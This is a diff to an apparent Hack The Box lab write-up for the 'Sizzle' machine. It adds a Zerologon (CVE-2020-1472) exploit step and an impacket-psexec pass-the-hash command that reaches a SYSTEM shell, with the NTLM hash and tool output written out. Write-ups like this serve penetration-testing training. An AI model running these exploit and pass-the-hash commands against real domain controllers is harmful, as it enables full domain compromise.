@@ -314,7 +314,7 @@ SMB         10.129.19.191   445    SIZZLE           [+] HTB.LOCAL\amanda:Ashare1
 ```
 This user is compromised
 
-# Domain Admin
+# Domain Admin via zerologon
 ```python
 python3 cve-2020-1472-exploit.py SIZZLE 10.129.19.191                                                                        
 Performing authentication attempts...
@@ -372,5 +372,21 @@ I now have all the hashes but looking at bloodhound the domain admins are `admin
 So ill have to use `wmiexec` or `psexec`
 
 ```python
+impacket-psexec htb.local/sizzler@sizzle.htb.local -hashes ':d79f820afad0cbc828d79e16a6f890de'                                                                    
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Requesting shares on sizzle.htb.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file NCGyjYuQ.exe
+[*] Opening SVCManager on sizzle.htb.local.....
+[*] Creating service bASB on sizzle.htb.local.....
+[*] Starting service bASB.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32>
 ```
